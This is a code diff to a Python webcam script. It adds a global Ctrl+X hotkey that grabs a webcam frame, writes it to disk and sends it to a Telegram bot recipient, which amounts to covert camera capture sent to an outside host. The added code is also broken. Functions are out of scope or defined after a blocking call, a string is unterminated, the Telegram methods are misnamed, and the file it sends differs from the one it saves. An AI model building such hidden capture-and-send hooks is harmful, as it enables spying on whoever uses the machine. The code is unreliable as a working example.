@@ -9,3 +9,26 @@ while True:
         break
 cam.release()
 cv2.destroyAllWindows
+
+def ctrlX():
+    def press_ctrl_x():
+        takePhoto()
+
+
+hotkeys = {'<ctrl>+x': press_ctrl_x}
+
+with keyboard.GlobalHotKeys(hotkeys) as listener:
+    listener.join()
+
+def takePhoto():
+    import cv2
+    import telepot
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    cv2.imwrite('c:xxxxxxxxxxxxxxxxxxx,frame)   #colocar direccion de la imagen reemplazar por la x
+    cap.release()
+    bot = telepot.Bot(token)
+    bot.Message(receiver_id,'picture taken.')
+    bot.sendphoto(receiver_id, photo=open('SCREENSHOT', 'rb')) #sustituir rb por frame
+
+
